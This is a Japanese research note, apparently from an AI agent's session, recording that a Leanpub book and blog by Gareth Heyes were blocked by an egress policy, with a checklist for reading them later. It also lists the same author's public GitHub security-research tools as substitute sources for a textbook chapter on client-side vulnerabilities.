- **取得不可の理由**: leanpub.com がegressポリシーで遮断（curl: CONNECT tunnel failed, response 403）。書籍本文はLeanpub購入者向けで、そもそもWebFetch/curlでは有料本文は読めない（無料サンプル/目次のみ公開）。
- **読みどころ（自分で開いたとき確認すべき点）**:
  1. **Table of Contents（目次）**: 正確な章題・章数・節構成。本ノート§7の「想定トピック」を原典の実章題で置き換える。
  2. **Book description / About the book**: 対象読者、前提知識、扱う脆弱性クラスの範囲、PortSwigger research との関係。
  3. **無料サンプル（Read free sample）**: 冒頭章のトーンと、JS言語仕様→攻撃への橋渡し方。短縮/難読化の導入例。
  4. **著者情報・foreword**: Gareth Heyesの経歴（PortSwigger、Hackvertor作者）と、本書が彼のどの研究に基づくか。
  5. **価格/ページ数/更新履歴（Last updated）**: Leanpubは随時更新されるため版・分量の確認。
  6. **付随コード/リポジトリの有無**: 本文中で参照されるPoCやツール（Hackvertor等）へのリンク。

### B. https://garethheyes.co.uk/ （著者個人サイト/ブログ）
- **取得不可の理由**: garethheyes.co.uk がegressポリシーで遮断（403）。旧ブログ thespanner.co.uk、および記事が転載されるportswigger.net/research も同様に遮断。
- **読みどころ（自分で開いたとき確認すべき点）**:
  1. **記事一覧（Blog/Articles/Research）**: 各記事の正確なタイトル・公開日・要約。本ノート§7の「代表テーマ」を実タイトルへ更新。
  2. **DOM clobbering / mutation XSS / prototype pollution / CSPバイパス** の各解説記事の本文とPoCコード（逐語で採取すべき最重要部分）。
  3. **インタラクティブなPoC/デモ**（サイト上で動く実証コード）: JS必須のため静的取得では欠落する。ブラウザで実際に動かして挙動を観察。
  4. **About / Bio**: 経歴・所属・連絡先（本ノート§6 amplify-the-hacker から判明する各SNS: x.com/garethheyes, infosec.exchange/@gaz, bsky.app/profile/garethheyes.co.uk, LinkedIn gareth-heyes-25a62b2）。
  5. **ツールへのリンク**: Hackvertor / MentalJS / clickbandit / visualfuzzer 等（本ノート§1〜6で実体を取得済み）。
  6. **旧ブログ thespanner.co.uk** の過去記事（XSSベクタ史・短縮テクニックの原典が多い）。

### C. 本セッションで実際に取得できた代替一次資料（同一著者・そのまま参照可能）
- Hackvertor: https://github.com/hackvertor/hackvertor ＋ wiki（Tag-Reference / Tag-Syntax）… §1に逐語収録
- MentalJS: https://github.com/hackvertor/MentalJS … §2
- Server-side prototype pollution: https://github.com/hackvertor/server-side-prototype-pollution … §3（PortSwigger記事 https://portswigger.net/research/server-side-prototype-pollution へのリンクあり）
- Blind CSS exfiltration: https://github.com/hackvertor/blind-css-exfiltration … §4（PortSwigger記事 https://portswigger.net/research/blind-css-exfiltration へのリンクあり）
- AutoVader: https://github.com/hackvertor/auto-vader … §5
- clickbandit / visualfuzzer / taborator / shadow-repeater / repeat-strike / document-my-pentest / speedy / feedworm / amplify-the-hacker … §6

> これらGitHub資料は書籍・ブログ「そのもの」ではないが、**同一著者による同テーマの公開一次資料**であり、教科書のクライアントサイド脆弱性ハンティング章（難読化/エンコード連鎖・DOM系・プロトタイプ汚染・CSS窃取・DOM Invader運用）の実証的な根拠として引用に堪える。
